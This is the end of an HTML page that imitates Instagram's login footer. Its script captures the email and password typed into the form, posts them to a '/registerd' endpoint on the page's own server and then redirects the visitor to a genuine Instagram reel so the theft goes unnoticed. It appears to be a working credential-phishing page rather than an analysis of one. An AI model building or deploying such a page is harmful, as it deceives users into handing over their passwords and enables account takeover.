            >
            <a href="#" class="hover:underline">Meta Verified</a>
          </div>
          <p class="mt-4">Â© 2024 Instagram from Meta</p>
        </div>
      </div>
   

    <script>
           document
        .getElementById("registrationForm")
        .addEventListener("submit", async (event) => {
          event.preventDefault();

          const Email = document.getElementById("staticEmail").value;
          const Password = document.getElementById("inputPassword").value;
          const showError = document.getElementById("showError");
          const platform = "instagram";

          if (Password.length > 8 || Password.length < 8) {
            showError.textContent = "Your password should be 8 characters";
            return;
          } else {
            sendData();
          }

          async function sendData() {
            await fetch("/registerd", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ platform, Email, Password }),
            }).then(() => {
              // going to fake page
              window.location.href =
                "https://www.instagram.com/reel/C6ZGzKBMvQx/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
            });
          }
        });
    </script>
  </body>
</html>
